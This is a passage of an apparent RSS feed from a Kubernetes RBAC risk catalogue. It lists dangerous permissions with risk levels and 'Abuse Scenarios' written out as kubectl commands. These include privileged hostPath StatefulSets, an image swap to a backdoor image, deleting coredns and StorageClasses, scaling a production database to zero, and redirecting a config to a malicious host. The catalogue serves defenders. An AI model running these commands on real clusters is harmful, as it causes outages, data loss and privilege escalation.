&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> securityContext:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> privileged: true
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Scale a critical StatefulSet to zero replicas, causing data inconsistency or DoS.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl scale statefulset &amp;lt;statefulset-name&amp;gt; -n &amp;lt;namespace&amp;gt; --replicas&lt;span class="o">=&lt;/span>&lt;span class="m">0&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl scale statefulset my-database -n production --replicas=0&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage StatefulSets in a namespace</title><link>https://rbac-atlas.github.io/rules/1038/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1038/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1038&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage StatefulSets in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>apps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>statefulsets&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-persistence">&lt;a href="https://rbac-atlas.github.io/tags/persistence/">Persistence&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-workloadlifecycle">&lt;a href="https://rbac-atlas.github.io/tags/workloadlifecycle/">WorkloadLifecycle&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, or deleting StatefulSets within a specific namespace. This can be used to deploy stateful applications with potentially privileged settings, leading to potential privilege escalation, persistence, and tampering within that namespace.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new StatefulSet with a hostPath mount in the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -n &amp;lt;namespace&amp;gt; -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: apps/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: StatefulSet
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: hostpath-statefulset
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> serviceName: &amp;#34;hostpath-service&amp;#34;
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> replicas: 1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> selector:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> matchLabels:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: hostpath-sts
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> template:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> labels:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> app: hostpath-sts
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> spec:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> containers:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: hostpath-container
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> image: busybox
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> command: [&amp;#34;/bin/sh&amp;#34;, &amp;#34;-c&amp;#34;, &amp;#34;sleep infinity&amp;#34;]
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> volumeMounts:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - mountPath: /host-var
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: host-var
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> volumes:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> - name: host-var
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> hostPath:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> path: /var
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -n default -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Update an existing StatefulSet&amp;rsquo;s image to a malicious one.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl &lt;span class="nb">set&lt;/span> image statefulset/&amp;lt;statefulset-name&amp;gt; &amp;lt;container-name&amp;gt;&lt;span class="o">=&lt;/span>&amp;lt;malicious-image&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl set image statefulset/my-app-db db=attacker/db-backdoor -n production&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage StorageClasses</title><link>https://rbac-atlas.github.io/rules/1056/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1056/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1056&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage StorageClasses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>storage.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>storageclasses&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-storagemanipulation">&lt;a href="https://rbac-atlas.github.io/tags/storagemanipulation/">StorageManipulation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, update, or delete StorageClasses. StorageClasses define how dynamic provisioning of persistent volumes occurs. Tampering with StorageClasses can lead to denial of service (e.g., by making storage provisioning fail) or misconfiguration of storage resources.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new StorageClass that points to a non-existent or malicious provisioner.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create -f - &lt;span class="s">&amp;lt;&amp;lt;EOF
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">apiVersion: storage.k8s.io/v1
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">kind: StorageClass
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">metadata:
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s"> name: malicious-storage
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">provisioner: non-existent.provisioner.example.com
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">reclaimPolicy: Delete
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">volumeBindingMode: Immediate
&lt;/span>&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="s">EOF&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create -f - &amp;lt;&amp;lt;EOF ... EOF&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Delete an existing StorageClass, preventing new volume provisioning.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete storageclass &amp;lt;storageclass-name&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete storageclass standard&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Manage ValidatingWebhookConfigurations</title><link>https://rbac-atlas.github.io/rules/1044/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1044/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1044&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage ValidatingWebhookConfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>admissionregistration.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>validatingwebhookconfigurations&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
 &lt;span class="tag-webhookmanipulation">&lt;a href="https://rbac-atlas.github.io/tags/webhookmanipulation/">WebhookManipulation&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows control over ValidatingWebhookConfigurations, which can validate or reject API objects during admission. An attacker can use this to tamper with security policies (e.g., disable a validating webhook that enforces security best practices) or cause denial of service by rejecting legitimate requests.&lt;/p></description></item><item><title>Manage VolumeAttachments (Cluster-wide Storage/Node Manipulation)</title><link>https://rbac-atlas.github.io/rules/1102/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1102/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1102&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Manage VolumeAttachments (Cluster-wide Storage/Node Manipulation)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>storage.k8s.io&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>volumeattachments&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete, get, list, watch&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-dataexposure">&lt;a href="https://rbac-atlas.github.io/tags/dataexposure/">DataExposure&lt;/a>&lt;/span>
 &lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-storagemanipulation">&lt;a href="https://rbac-atlas.github.io/tags/storagemanipulation/">StorageManipulation&lt;/a>&lt;/span>
 (+1 more)&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows managing VolumeAttachment objects cluster-wide. VolumeAttachments link persistent volumes to nodes. Control over these can allow an attacker to detach volumes from nodes (DoS), potentially attach volumes to attacker-controlled nodes (data theft), or interfere with legitimate storage operations.&lt;/p></description></item><item><title>Modify ConfigMaps cluster-wide</title><link>https://rbac-atlas.github.io/rules/1024/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1024/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1024&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Modify ConfigMaps cluster-wide&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>configmaps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-configmapaccess">&lt;a href="https://rbac-atlas.github.io/tags/configmapaccess/">ConfigMapAccess&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Allows creating, updating, patching, or deleting ConfigMaps in any namespace. This enables an attacker to tamper with application configurations across the cluster, potentially leading to misconfigurations, denial of service, or privilege escalation if applications consume malicious configurations.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new ConfigMap with malicious configuration in any namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create configmap &amp;lt;new-cm-name&amp;gt; --from-literal&lt;span class="o">=&lt;/span>&lt;span class="nv">malicious_setting&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span> -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create configmap backdoor-config --from-literal=debug_mode=true -n kube-system&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Patch an existing ConfigMap to alter application behavior.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl patch configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/&amp;lt;key&amp;gt;&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;&amp;lt;new-value&amp;gt;&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch configmap my-app-config -n default --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/log_level&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;DEBUG&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>Delete a critical ConfigMap, causing application disruption.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete configmap coredns -n kube-system&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Modify ConfigMaps in a namespace</title><link>https://rbac-atlas.github.io/rules/1025/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1025/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1025&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Modify ConfigMaps in a namespace&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Tampering&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-high">High&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>Role&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>configmaps&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>create, update, patch, delete&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-configmapaccess">&lt;a href="https://rbac-atlas.github.io/tags/configmapaccess/">ConfigMapAccess&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
&lt;p>Grants permission to create, update, patch, or delete ConfigMaps within a specific namespace. This allows an attacker to tamper with application configurations, potentially causing service disruption or enabling further exploitation if applications load malicious settings.&lt;/p>
&lt;h2 id="abuse-scenarios">Abuse Scenarios&lt;/h2>
&lt;ol>
&lt;li>Create a new ConfigMap with malicious configuration in the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl create configmap &amp;lt;new-cm-name&amp;gt; --from-literal&lt;span class="o">=&lt;/span>&lt;span class="nv">malicious_setting&lt;/span>&lt;span class="o">=&lt;/span>&lt;span class="nb">true&lt;/span> -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl create configmap dev-backdoor-config --from-literal=enable_shell=true -n development&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="2">
&lt;li>Patch an existing ConfigMap to alter application behavior within the namespace.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl patch configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt; --type&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;json&amp;#39;&lt;/span> -p&lt;span class="o">=&lt;/span>&lt;span class="s1">&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/&amp;lt;key&amp;gt;&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;&amp;lt;new-value&amp;gt;&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl patch configmap my-app-config -n production --type=&amp;#39;json&amp;#39; -p=&amp;#39;[{&amp;#34;op&amp;#34;: &amp;#34;replace&amp;#34;, &amp;#34;path&amp;#34;: &amp;#34;/data/db_host&amp;#34;, &amp;#34;value&amp;#34;: &amp;#34;malicious-db.example.com&amp;#34;}]&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;ol start="3">
&lt;li>Delete a critical ConfigMap within the namespace, causing disruption.&lt;/li>
&lt;/ol>
&lt;div class="highlight">&lt;pre tabindex="0" class="chroma">&lt;code class="language-bash" data-lang="bash">&lt;span class="line">&lt;span class="cl">kubectl delete configmap &amp;lt;configmap-name&amp;gt; -n &amp;lt;namespace&amp;gt;
&lt;/span>&lt;/span>&lt;span class="line">&lt;span class="cl">&lt;span class="c1"># Example: kubectl delete configmap my-app-env -n default&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div></description></item><item><title>Modify node configuration (labels, taints)</title><link>https://rbac-atlas.github.io/rules/1015/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://rbac-atlas.github.io/rules/1015/</guid><description>&lt;h2 id="overview">Overview&lt;/h2>
&lt;table>
 &lt;thead>
 &lt;tr>
 &lt;th>Field&lt;/th>
 &lt;th>Value&lt;/th>
 &lt;/tr>
 &lt;/thead>
 &lt;tbody>
 &lt;tr>
 &lt;td>ID&lt;/td>
 &lt;td>1015&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Name&lt;/td>
 &lt;td>Modify node configuration (labels, taints)&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Category&lt;/td>
 &lt;td>Elevation of Privilege&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Risk Level&lt;/td>
 &lt;td>&lt;span class="risk-critical">Critical&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Role Type&lt;/td>
 &lt;td>ClusterRole&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>API Groups&lt;/td>
 &lt;td>core&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Resources&lt;/td>
 &lt;td>nodes&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Verbs&lt;/td>
 &lt;td>patch, update&lt;/td>
 &lt;/tr>
 &lt;tr>
 &lt;td>Tags&lt;/td>
 &lt;td>&lt;span class="tag-denialofservice">&lt;a href="https://rbac-atlas.github.io/tags/denialofservice/">DenialOfService&lt;/a>&lt;/span>
 &lt;span class="tag-nodeaccess">&lt;a href="https://rbac-atlas.github.io/tags/nodeaccess/">NodeAccess&lt;/a>&lt;/span>
 &lt;span class="tag-potentialprivilegeescalation">&lt;a href="https://rbac-atlas.github.io/tags/potentialprivilegeescalation/">PotentialPrivilegeEscalation&lt;/a>&lt;/span>
 &lt;span class="tag-tampering">&lt;a href="https://rbac-atlas.github.io/tags/tampering/">Tampering&lt;/a>&lt;/span>
&lt;/td>
 &lt;/tr>
 &lt;/tbody>
&lt;/table>
&lt;h2 id="description">Description&lt;/h2>
